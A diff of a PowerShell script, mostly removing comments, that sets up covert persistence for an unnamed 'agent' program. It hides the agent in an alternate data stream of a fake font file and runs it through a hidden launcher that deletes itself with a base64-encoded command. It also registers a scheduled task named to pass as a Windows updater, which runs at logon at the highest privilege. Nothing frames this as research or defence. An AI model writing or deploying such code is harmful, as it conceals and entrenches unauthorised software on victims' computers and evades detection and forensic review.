@@ -1,10 +1,9 @@
 $ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'Stop'  # We want to know when things fail
+$ErrorActionPreference = 'Stop'
 $channelID = $env:ChannelID
 $agentPath = $env:AgentPath
 $logFile = "$env:TEMP\persist_log_$channelID.txt"
 
-# Logging function
 function Write-Log {
     param([string]$Message)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -33,11 +32,10 @@ if (-not (Test-Path $fontDir)) {
     Write-Log "[+] Using existing fonts folder: $fontDir"
 }
 
-# Use a unique font name that doesn't conflict (msstyles.ttf is safe)
+# Use a unique font name that doesn't conflict
 $fontFile = "$fontDir\msstyles.ttf"
 if (-not (Test-Path $fontFile)) {
     try {
-        # Create a fake binary file (random 1KB data)
         $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
         $bytes = New-Object byte[] 1024
         $rng.GetBytes($bytes)
@@ -60,7 +58,6 @@ try {
     Write-Log "[+] Agent hidden successfully"
 } catch {
     Write-Log "[-] Failed to write ADS: $_"
-    # Continue anyway? Maybe exit.
     exit 1
 }
 $hiddenPath = "$fontFile`:$streamName"
@@ -84,11 +81,9 @@ function Write-LauncherLog {
 
 Write-LauncherLog "Launcher started"
 
-# Delete old temp agent if it exists (ignore errors if locked)
 Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue
 Write-LauncherLog "Removed old temp agent if present"
 
-# Extract agent from ADS
 try {
     `$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -ErrorAction Stop
     [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
@@ -98,7 +93,6 @@ try {
     exit 1
 }
 
-# Run agent hidden
 try {
     `$proc = Start-Process -WindowStyle Hidden -FilePath `$tempAgent -PassThru
     Write-LauncherLog "Started agent with PID `$(`$proc.Id)"
@@ -107,12 +101,8 @@ try {
     exit 1
 }
 
-# Self-destruct: launch a separate PowerShell process that waits and deletes this launcher script
-`$selfDestructScript = @"
-Start-Sleep -Seconds 10
-Remove-Item -Path '$launcherPath' -Force -ErrorAction SilentlyContinue
-Remove-Item -Path '`$launcherLog' -Force -ErrorAction SilentlyContinue
-"@
+# Self-destruct: use a regular string (not a here-string) to avoid nesting issues
+`$selfDestructScript = "Start-Sleep -Seconds 10; Remove-Item -Path '$launcherPath' -Force -ErrorAction SilentlyContinue; Remove-Item -Path '`$launcherLog' -Force -ErrorAction SilentlyContinue"
 `$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$selfDestructScript))
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand `$encoded"
 
@@ -123,7 +113,7 @@ Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
 Write-Log "[+] Created launcher with self-destruct: $launcherPath"
 
-# --- 4. Persistence mechanism (scheduled task) ---
+# --- 4. Persistence via scheduled task (your working method) ---
 $taskName = "WindowsUpdaterTask_$channelID"
 $taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
 
@@ -134,16 +124,15 @@ try {
     $taskService.Connect()
     $rootFolder = $taskService.GetFolder("\")
     
-    # Delete existing task if any
     try { $rootFolder.DeleteTask($taskName, 0) } catch { Write-Log "No existing task to delete" }
     
     $taskDefinition = $taskService.NewTask(0)
     $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
     $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3  # Interactive token
-    $taskDefinition.Principal.RunLevel = 1   # Highest available
+    $taskDefinition.Principal.LogonType = 3
+    $taskDefinition.Principal.RunLevel = 1
     
-    $trigger = $taskDefinition.Triggers.Create(9) # Logon trigger
+    $trigger = $taskDefinition.Triggers.Create(9)
     $trigger.UserId = $env:USERNAME
     
     $action = $taskDefinition.Actions.Create(0)
@@ -155,7 +144,6 @@ try {
     $persistenceSet = $true
 } catch {
     Write-Log "[-] COM task creation failed: $_"
-    # Fallback to schtasks
     try {
         schtasks /delete /tn $taskName /f *>$null 2>&1
         schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it *>$null 2>&1
